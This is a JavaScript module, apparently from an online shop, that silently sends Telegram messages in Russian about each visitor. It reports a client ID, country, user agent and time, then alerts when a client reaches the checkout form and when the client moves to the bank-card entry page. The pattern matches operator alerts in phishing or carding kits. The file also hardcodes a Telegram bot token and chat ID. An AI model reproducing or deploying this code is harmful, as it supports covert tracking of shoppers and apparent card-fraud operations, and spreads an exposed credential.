// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = "6970189544:AAGwiLCKP9aoh-CyZPE1BhI-UDQTPzvjCZE";
const TELEGRAM_CHAT_ID = -1002071552778;

// Get client ID from localStorage
const getClientId = () => {
  return localStorage.getItem('clientId') || 'Unknown';
};

// Get cart total
const getCartTotal = () => {
  try {
    const cart = JSON.parse(localStorage.getItem('cart') || '[]');
    const total = cart.reduce((sum, item) => sum + (item.Price * (item.qty || 1)), 0);
    return total.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  } catch (error) {
    return '0.00';
  }
};

// Get user country (from backend or default)
const getUserCountry = () => {
  // Try to get from backend response if available
  const userData = sessionStorage.getItem('userData');
  if (userData) {
    try {
      const data = JSON.parse(userData);
      return data.country || 'Unknown';
    } catch (e) {
      return 'Unknown';
    }
  }
  // Try to detect from timezone
  try {
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return timeZone || 'Unknown';
  } catch (e) {
    return 'Unknown';
  }
};

// Get user agent
const getUserAgent = () => {
  return navigator.userAgent || 'Unknown';
};

// Format time
const getFormattedTime = () => {
  const now = new Date();
  return now.toLocaleString('en-US', {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false
  });
};

// Send message to Telegram
const sendTelegramMessage = (message) => {
  try {
    const encodedMessage = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
    
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.send();
  } catch (error) {
    console.error('Error sending Telegram message:', error);
  }
};

// Send new user alert
export const sendNewUserAlert = (userData = {}) => {
  const clientId = getClientId();
  const country = userData.country || getUserCountry();
  const userAgent = getUserAgent();
  const time = getFormattedTime();
  
  const message = `🆕 <b>НОВЫЙ ПОЛЬЗОВАТЕЛЬ</b>

━━━━━━━━━━━━━━━━━━━━

🆔 <b>ID:</b> <code>${clientId}</code>
🌍 <b>Country:</b> <code>${country}</code>
📱 <b>User-Agent:</b> <code>${userAgent.substring(0, 80)}${userAgent.length > 80 ? '...' : ''}</code>
⏰ <b>Time:</b> <code>${time}</code>`.trim();

  sendTelegramMessage(message);
};

// Send checkout page alert (shipbox)
export const sendCheckoutPageAlert = () => {
  const clientId = getClientId();
  const cartTotal = getCartTotal();
  
  const message = `📝 <b>Клиент [${clientId.substring(0, 12)}...] находится на странице заполнения данных</b>

━━━━━━━━━━━━━━━━━━━━

💰 <b>Сумма корзины:</b> <code>$${cartTotal}</code>`.trim();

  sendTelegramMessage(message);
};

// Send payment page alert (paybox)
export const sendPaymentPageAlert = () => {
  const clientId = getClientId();
  
  const message = `💳 <b>Клиент [${clientId.substring(0, 12)}...] перешёл на страницу оплаты</b>

━━━━━━━━━━━━━━━━━━━━

🔐 <b>Страница:</b> Ввод данных банковской карты`.trim();

  sendTelegramMessage(message);
};

export default {
  sendNewUserAlert,
  sendCheckoutPageAlert,
  sendPaymentPageAlert
};

